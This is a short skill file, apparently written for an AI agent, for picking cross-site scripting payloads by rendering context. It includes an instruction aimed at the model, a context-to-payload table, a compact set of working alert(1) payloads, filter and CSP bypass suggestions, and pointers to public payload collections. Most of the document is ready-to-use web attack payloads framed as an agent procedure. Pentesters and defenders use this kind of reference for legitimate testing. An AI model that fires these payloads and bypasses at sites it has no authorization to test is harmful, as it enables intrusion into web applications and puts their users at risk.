# SKILL: XSS Payload Selection — Context Matrix and Quick Picks

> **AI LOAD INSTRUCTION**: Use this skill to choose XSS payloads by rendering context, reflection pattern, and filter behavior. Keep payloads compact and context-aware; do not spray giant lists.

## 1. WHEN TO LOAD THIS SKILL

Load this skill when input is reflected, stored, or client-side rendered and you need the right payload family fast.

For deeper technique and post-exploitation, also load:

- `skills/injection-checking/XSS_Cross_Site_Scripting.skill.md`

## 2. CONTEXT-TO-PAYLOAD MAP

| Context | First Pick | Backup |
|---|---|---|
| HTML body | `<svg onload=alert(1)>` | `<img src=1 onerror=alert(1)>` |
| Quoted attribute | `" autofocus onfocus=alert(1)//` | `" onmouseover=alert(1)//` |
| JavaScript string | `'-alert(1)-'` | `'</script><svg onload=alert(1)>` |
| URL / href sink | `javascript:alert(1)` | `data:text/html,<svg onload=alert(1)>` |
| Tag body like `title` | `</title><svg onload=alert(1)>` | `</textarea><svg onload=alert(1)>` |
| SVG / XML sink | `<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>` | XHTML namespace payload |

## 3. SMALL, STABLE PAYLOAD SET

```html
<svg onload=alert(1)>
<img src=1 onerror=alert(1)>
" autofocus onfocus=alert(1)//
'</script><svg onload=alert(1)>
javascript:alert(1)
data:text/html,<svg onload=alert(1)>
```

## 4. FILTER-BYPASS FAMILY PICKS

| Filter Behavior | Try |
|---|---|
| strips spaces | `<svg/onload=alert(1)>` |
| blocks `<script>` only | event handlers, `srcdoc`, `javascript:` |
| HTML-encodes on first render | second-order payload like `&lt;svg/onload&equals;alert(1)&gt;` |
| multiple reflections | use a multi-reflection payload from the full XSS skill |
| CSP blocks inline | pivot to JSONP, Angular/CSTI, or trusted script source abuse |

## 5. SOURCE POOLS TO CONSULT

- Web-Fuzzing-Box: `Vuln/Xss/All.txt`, `Events.txt`
- PayloadsAllTheThings: `XSS Injection/`

Use them as payload pools after the context is known. Do not load them wholesale.

## 6. QUICK CHECKLIST

1. Identify HTML, attribute, JS, URL, or XML context.
2. Use one small payload that matches the context exactly.
3. Observe encoding, filtering, and reflection count.
4. Escalate to the full XSS skill only after first signal.